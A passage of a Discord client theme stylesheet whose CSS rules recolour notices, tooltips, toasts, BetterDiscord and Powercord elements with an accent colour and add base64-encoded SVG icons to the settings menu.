	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh {											/* partneredbadge											*/
	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh .flowerStar-1GeTsn {
	filter: brightness(75%);
}

/* ----		12.5.	ICONS							---- */

[style*="/assets/f78426a064bc9dd24847519259bc42af.png"],
[src*="/assets/f78426a064bc9dd24847519259bc42af.png"] {		/* avatars				clyde								*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/clydeicon_details.svg) center/contain no-repeat !important;
}
[style*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"],
[src*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"] {		/* avatars				blue discord						*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/blurplediscordicon_details.svg) center/contain no-repeat !important;
}

/* ----		12.6.	SCROLLBARS						---- */

.scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-dark .scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerWrap-2lJEkd .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerThemed-2oenus.themedWithTrack-q8E3vB .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollbarDefault-3COgCQ::-webkit-scrollbar-thumb {
	background-color: rgb(var(--vaccentcolor));
}

::-webkit-scrollbar-corner,
#app-mount ::-webkit-scrollbar-corner {
	background-color: transparent;
}

/* ----		12.7.	NOTIFICATIONBAR					---- */

.colorPremiumTier1-3D7SPt {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.7));
}
.colorPremiumTier1-3D7SPt .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorPremiumTier2-dCdap5 {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.colorPremiumTier2-dCdap5 .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h {
	background-color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor)) !important;
}
.notice-2X5hT5 {											/* preview notice											*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-2PWmas:hover {										/* preview notice		button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-1tZwqv {											/* role notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-3Ijpww:hover {										/* role notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-3uyY6c {											/* rules notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-gP4R86:hover {										/* rules notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}

/* ----		12.8.	TOOLTIPS						---- */

#app-mount .tooltipBrand-g03Nz8 {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tooltipBrand-g03Nz8 .tooltipPointer-3ZfirK {
	border-top-color: rgb(var(--vaccentcolor));
}

.content-3O0wBS {
	background-color: rgb(var(--vaccentcolor));
}
.content-3O0wBS	.button-3zdF3z {
	color: rgb(var(--vaccentcolor));
}
.pointer-3ClhC2 {
	border-top-color: rgb(var(--vaccentcolor));
}

/* ----		12.9.	TOASTS							---- */

.toast-brand {
	background-color: rgb(var(--vaccentcolor));
}
.colorBrand-WfDfzD .bg-8df5St {
	background-color: rgb(var(--vaccentcolor));
}
.colorCustom-WKsPgT .bg-8df5St[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.bar-95Sdw1.customBar-3RsUzs[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		13.		BDSUPPORT						~~~~ */

#bd-pub-button {
	color: var(--text-normal);
	transition: background-color .15s ease-out, color .15s ease-out;
}
#bd-pub-button:hover {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background-color: rgb(var(--vaccentcolor));
}
#bd-pub-button:active {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background: var(--vaccentcolor-hover);
}
#pubslayer button:hover {
	background: var(--vaccentcolor-hover);
}
#pubslayer button:active {
	background: var(--vaccentcolor-active);
}
.bd-server-card.bd-server-card-pinned::after {
	background: var(--bd-blue);
}

.bd-modal-wrapper .footer button {
	background: var(--bd-blue);
}
.bd-modal-wrapper .footer button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-modal-wrapper .footer button:active {
	background: var(--vaccentcolor-active);
}
.bd-modal-wrapper .error-link {
	color: var(--bd-blue);
}

.bd-pfbtn {
	background: var(--bd-blue);
}
.bd-pfbtn:hover {
	background: var(--vaccentcolor-hover);
}
.bd-pfbtn:active {
	background: var(--vaccentcolor-active);
}

.bd-button {
	background: var(--bd-blue);
}
.bd-button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-button:active {
	background: var(--vaccentcolor-active);
}

.bd-addon-views .bd-view-button.selected {
	background: var(--bd-blue);
}

.bd-addon-list .bd-footer a {
	color: var(--bd-blue);
}

.bd-server-tag {
	background: var(--bd-blue);
}

#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked,
.bd-switch-checked {
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:hover,
.bd-switch-checked:hover {
	background: var(--vaccentcolor-hover);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:active,
.bd-switch-checked:active {
	background: var(--vaccentcolor-active);
}
.bd-switch::before {
	box-shadow: none;
}

html .monaco-editor .find-widget .monaco-inputbox.synthetic-focus {
	outline-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .monaco-editor-hover a {
	color: rgb(var(--vaccentcolor));
}
html .monaco-editor [class*="arrow-decoration"] {
	border-bottom-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .focused .selected-text {
	background-color: rgb(var(--vaccentcolor));
}

html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) {
	background-color: rgb(var(--vaccentcolor));
	color: #ffffff;
}
html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) .results-group {
	color: #ffffff !important;
}

html .monaco-editor [style*="background-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="background: rgb(0, 122, 204)"],
html .monaco-editor [style*="background-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="background: rgb(14, 122, 192)"],
html .monaco-editor [style*="background-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="background: rgb(14, 99, 156)"],
html .monaco-editor [style*="background-color: rgb(9, 71, 113)"],
html .monaco-editor [style*="background: rgb(9, 71, 113)"] {
	background: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.9)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.9)"] {
	background: rgba(var(--vaccentcolor), 0.9) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.8)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.8)"] {
	background: rgba(var(--vaccentcolor), 0.8) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.7)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.7)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.7)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.7)"] {
	background: rgba(var(--vaccentcolor), 0.7) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.6)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.6)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.6)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.6)"] {
	background: rgba(var(--vaccentcolor), 0.6) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.5)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.5)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.5)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.5)"] {
	background: rgba(var(--vaccentcolor), 0.5) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.4)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.4)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.4)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.4)"] {
	background: rgba(var(--vaccentcolor), 0.4) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.3)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.3)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.3)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.3)"] {
	background: rgba(var(--vaccentcolor), 0.3) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.2)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.2)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.2)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.2)"] {
	background: rgba(var(--vaccentcolor), 0.2) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.1)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.1)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.1)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.1)"] {
	background: rgba(var(--vaccentcolor), 0.1) !important;
}
html .monaco-editor [style*="border-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-color: rgb(9, 71, 113)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-top-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-top-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-top-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-top-color: rgb(9, 71, 113)"] {
	border-top-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-right-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-right-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-right-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-right-color: rgb(9, 71, 113)"] {
	border-right-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-bottom-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-bottom-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-bottom-color: rgb(9, 71, 113)"] {
	border-bottom-color: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="border-left-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="border-left-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="border-left-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="border-left-color: rgb(9, 71, 113)"] {
	border-left-color: rgb(var(--vaccentcolor)) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(62, 130, 229)"],
.embedFull-2tM8--[style*="border-color: rgb(62, 130, 226)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		14.		POWERCORDSUPPORT				~~~~ */

html .powercord-toast[data-toast-type=info] .icon {
	color: rgb(var(--vaccentcolor));
}
html .powercord-toast .progressBar-3u8FBM {
	background-color: rgb(var(--vaccentcolor));
}

html .powercord-updater .debug-info b {
	color: rgb(var(--vaccentcolor));
}


/* ~~~~		15.		PLUGINSUPPORT					~~~~ */

/* ----		15.1.	IMAGEZOOM						---- */

.zoomLens-uOK8xV {
	border-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.2.	HIDEUTILS						---- */

#HideUtils-Settings button {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.3.	READALLNOTIFICATIONSBUTTON		---- */

.wrapper-1BJsBx:active .childWrapper-anI2G9.button-Jt-tIg{
	background: var(--vaccentcolor-hover);
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
}

/* ----		15.4.	SERVERSEARCH					---- */

#server-search .wrapper-25eVIn {
	background-color: rgb(47, 49, 54) !important;
	transition: background-color .16s ease-out;
}
#server-search .wrapper-25eVIn:hover {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		15.5.	CHANNELTABS						---- */

.channelTabs-unreadBadge:not(.channelTabs-noUnread) {
	background-color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		16.		THEMESUPPORT					~~~~ */

/* ----		16.1.	THEMEDEVBADGE					---- */

#app-mount .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}
#app-mount .topSectionPlaying-1J5E4n .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s,
#app-mount .headerPlaying-j0WQBV .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	background: rgb(var(--vaccentcolor)) !important;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Plugin Themes ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.hljs ol {
    list-style: none;
    counter-reset: linenumbers;
}

.hljs ol li {
    text-indent: -4ch;
    margin-left: 3.5ch;
    padding-left: 0.5ch;
    border-left: 1px solid rgba(0,0,0,0.2);
}

.hljs ol li::before {
    color: rgba(127,127,127,0.5);
    display: inline-block;
    width: 3ch;
    margin-right: 0.5ch;
    padding-right: 0.5ch;
    text-align: right;
    counter-increment: linenumbers;
    content: counter(linenumbers);
    -webkit-user-select: none;
    user-select: none;
}
/* --------------------------------------------------------------------------------------------------- */

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS | Settings-Icons ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/* Settings-Icons | Adds icons to the settings menu (made by Snapperito, botato, MulverineX, AAGaming)*/
/* Note These Might Not Work */

.sidebar-CFHs9e #bd-settings-sidebar .ui-tab-bar-item, [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ {
	padding-left: 50px !important
}

.sidebar-CFHs9e #bd-settings-sidebar .ui-tab-bar-item:before, [aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:before {
	content: "";
	position: absolute;
	width: 24px;
	height: 24px;
	left: 15px;
	margin-top: -2px
}

/* User Settings */
[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(2):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Im0xMiAxMmMyLjIxIDAgNC0xLjc5IDQtNHMtMS43OS00LTQtNC00IDEuNzktNCA0IDEuNzkgNCA0IDR6bTAgMmMtMi42NyAwLTggMS4zNC04IDR2MmgxNnYtMmMwLTIuNjYtNS4zMy00LTgtNHoiLz4KPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPgo8L3N2Zz4=)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(3):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0xMiAxTDMgNXY2YzAgNS41NSAzLjg0IDEwLjc0IDkgMTIgNS4xNi0xLjI2IDktNi40NSA5LTEyVjVsLTktNHptMCAxMC45OWg3Yy0uNTMgNC4xMi0zLjI4IDcuNzktNyA4Ljk0VjEySDVWNi4zbDctMy4xMXY4Ljh6Ii8+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPC9zdmc+Cg==)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(4):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik00IDhoNFY0SDR2NHptNiAxMmg0di00aC00djR6bS02IDBoNHYtNEg0djR6bTAtNmg0di00SDR2NHptNiAwaDR2LTRoLTR2NHptNi0xMHY0aDRWNGgtNHptLTYgNGg0VjRoLTR2NHptNiA2aDR2LTRoLTR2NHptMCA2aDR2LTRoLTR2NHoiLz4KPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPgo8L3N2Zz4K)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(5):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTMuOSAxMmMwLTEuNzEgMS4zOS0zLjEgMy4xLTMuMWg0VjdIN2MtMi43NiAwLTUgMi4yNC01IDVzMi4yNCA1IDUgNWg0di0xLjlIN2MtMS43MSAwLTMuMS0xLjM5LTMuMS0zLjF6TTggMTNoOHYtMkg4djJ6bTktNmgtNHYxLjloNGMxLjcxIDAgMy4xIDEuMzkgMy4xIDMuMXMtMS4zOSAzLjEtMy4xIDMuMWgtNFYxN2g0YzIuNzYgMCA1LTIuMjQgNS01cy0yLjI0LTUtNS01eiIvPgo8L3N2Zz4=)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(11):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KPHBhdGggZD0iTTIwIDRINGMtMS4xMSAwLTEuOTkuODktMS45OSAyTDIgMThjMCAxLjExLjg5IDIgMiAyaDE2YzEuMTEgMCAyLS44OSAyLTJWNmMwLTEuMTEtLjg5LTItMi0yem0wIDE0SDR2LTZoMTZ2NnptMC0xMEg0VjZoMTZ2MnoiLz4KPC9zdmc+)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(8):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CjxyZWN0IHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIvPgo8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDIpIiBmaWxsPSIjMDNhNjUxIj4KPHBhdGggZD0ibTE0IDNjLTMuODY2IDAtNyAzLjEzNC03IDcgMCAzLjg2NiAzLjEzNCA3IDcgN3M3LTMuMTM0IDctN2MwLTMuODY2LTMuMTM0LTctNy03em0tMTEgNmgxYzAuNTUyMjggMCAxLTAuNDQ3NzIgMS0xcy0wLjQ0NzcyLTEtMS0xaC0zYy0wLjU1MjI4IDAtMS0wLjQ0NzcyLTEtMXMwLjQ0NzcyLTEgMS0xaDVjMC41NTIyOCAwIDEtMC40NDc3MiAxLTFzLTAuNDQ3NzItMS0xLTFoLTIuNWMtMC44Mjg0MyAwLTEuNS0wLjY3MTU3LTEuNS0xLjUgMC0wLjgyODQzIDAuNjcxNTctMS41IDEuNS0xLjVoMTAuNWM1LjUyMjggMCAxMCA0LjQ3NzIgMTAgMTBzLTQuNDc3MiAxMC0xMCAxMGMtNS4xODUzIDAtOS40NDg5LTMuOTQ2Ny05Ljk1MDYtOWgtMS4wNDk0Yy0wLjU1MjI4IDAtMS0wLjQ0NzcyLTEtMSAwLTAuNTUyMjggMC40NDc3Mi0xIDEtMXoiIGZpbGwtcnVsZT0ibm9uemVybyIvPgo8cGF0aCBkPSJtMTQgMTVjLTIuNzYxNCAwLTUtMi4yMzg2LTUtNSAwLTIuNzYxNCAyLjIzODYtNSA1LTVzNSAyLjIzODYgNSA1YzAgMi43NjE0LTIuMjM4NiA1LTUgNXptMS44MjctNy41NDk1Yy0wLjE4NDk1LTAuMjgxMTctMC40OTg5Mi0wLjQ1MDQ1LTAuODM1NDYtMC40NTA0NWgtMS45MjZjLTAuMzM2NTQgMC0wLjY1MDUyIDAuMTY5MjgtMC44MzU0NiAwLjQ1MDQ1bC0xLjMxNTUgMmMtMC4yMTkzOCAwLjMzMzUyLTAuMjE5MzggMC43NjU1NyAwIDEuMDk5MWwxLjMxNTUgMmMwLjE4NDk1IDAuMjgxMTcgMC40OTg5MiAwLjQ1MDQ1IDAuODM1NDYgMC40NTA0NWgxLjkyNmMwLjMzNjU0IDAgMC42NTA1Mi0wLjE2OTI4IDAuODM1NDYtMC40NTA0NWwxLjMxNTUtMmMwLjIxOTM4LTAuMzMzNTIgMC4yMTkzOC0wLjc2NTU3IDAtMS4wOTkxbC0xLjMxNTUtMnoiLz4KPC9nPgo8L2c+Cjwvc3ZnPgo=)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(10):before {
	background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBmaWxsPSIjRkZGRkZGIiB2aWV3Qm94PSIwIDAgMjQgMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Im0xNi44ODYgNy45OTloMy4xMTRjMS4xMDQgMCAyIDAuODk3IDIgMnYyaC0yMHYtMmMwLTEuMTAzIDAuODk3LTIgMi0yaDMuMTE0Yy0wLjQ1MS0wLjIzNS0wLjg3OC0wLjUyMi0xLjIzNS0wLjg3OC0xLjE3LTEuMTctMS4xNy0zLjA3MyAwLTQuMjQyIDEuMTMzLTEuMTMzIDMuMTA3LTEuMTMzIDQuMjQyLTJlLTMgMS42MzcgMS42MzcgMS44NTggNC43MTggMS44NzcgNS4wNjQgMC4wMDExIDAuMDExNS0wLjAwMTQgMC4wMjE3OS0wLjAwMzkgMC4wMzIwNC0wLjAwMjEgMC4wMDg0Ny0wLjAwNDEgMC4wMTY5MS0wLjAwNDEgMC4wMjU5NmgwLjAyYzAtMC4wMDkxNC0wLjAwMjEtMC4wMTc2Ni0wLjAwNDItMC4wMjYxMy0wLjAwMjQtMC4wMTAwNS0wLjAwNDktMC4wMjAwMS0wLjAwMzgtMC4wMzA4NyAwLjAyLTAuMzQ2IDAuMjQtMy40MjcgMS44NzctNS4wNjQgMS4xMzUtMS4xMzMgMy4xMDctMS4xMzIgNC4yNDItMWUtMyAxLjE2OSAxLjE3MiAxLjE2OSAzLjA3NSAwIDQuMjQ0LTAuMzU3IDAuMzU2LTAuNzg0IDAuNjQzLTEuMjM1IDAuODc4em0tOS41OTMtMi4yOTJjLTAuMzktMC4zOTEtMC4zOS0xLjAyNSAwLTEuNDE1IDAuMTg4LTAuMTg5IDAuNDM5LTAuMjkyIDAuNzA3LTAuMjkyczAuNTE5IDAuMTAzIDAuNzA3IDAuMjkyYzAuNTkgMC41OSAwLjkzNCAxLjY0OCAxLjExOCAyLjUzLTAuODgtMC4xODMtMS45NDYtMC41MjktMi41MzItMS4xMTV6bTYuODgxIDEuMTE3YzAuMTg1LTAuODgzIDAuNTI4LTEuOTQxIDEuMTE5LTIuNTMxIDAuMTg4LTAuMTkgMC40MzktMC4yOTMgMC43MDctMC4yOTNzMC41MTkgMC4xMDMgMC43MDYgMC4yOTFjMC4zOSAwLjM5MSAwLjM5MSAxLjAyNSAxZS0zIDEuNDE2LTAuNTkxIDAuNTkxLTEuNjUgMC45MzUtMi41MzMgMS4xMTd6bS0xMS4xNzQgNy4xNzV2NmMwIDEuMTAzIDAuODk3IDIgMiAyaDZ2LThoLTh6bTEwIDB2OGg2YzEuMTA0IDAgMi0wLjg5NyAyLTJ2LTZoLTh6Ii8+Cjwvc3ZnPgo=)
}

[aria-label="USER_SETTINGS"] .sidebar-CFHs9e .item-PXvHYJ:nth-child(9):before {
